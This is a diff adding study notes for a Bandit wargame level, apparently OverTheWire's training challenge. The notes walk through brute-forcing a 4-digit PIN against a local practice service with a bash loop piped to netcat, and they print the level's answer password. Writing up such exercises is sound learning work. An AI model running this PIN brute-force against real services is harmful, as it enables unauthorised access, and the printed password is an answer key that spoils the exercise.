@@ -1,0 +1,45 @@
+level 24 to 25
+
+Goal:
+A service is running on port 30002
+It will give the bandit25 password
+Only if you send:
+The bandit24 password
+A correct 4-digit PIN
+You don’t know the PIN, so you must try all 0000–9999 (brute force)
+
+idea:
+Instead of typing 10,000 PINs manually:
+Create a text file with all combinations
+Send them automatically to the service
+The correct one will return the password
+
+step by step:
+1.Create a working directory
+mkdir /tmp/bandit24
+cd /tmp/bandit24
+2.Create the script
+nano script.sh
+3.Paste this:
+
+#!/bin/bash
+
+for i in {0..9}{0..9}{0..9}{0..9}
+do
+  echo "BANDIT24_PASSWORD $i"
+done
+4.Make the script executable
+chmod +x script.sh
+5.Run the script and send output to the service
+./script.sh | nc localhost 30002
+6.What happens now?
+
+The script sends 10,000 attempts
+
+The service checks each one
+
+When the PIN is correct, it responds with:
+
+Correct!
+The password of bandit25 is: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
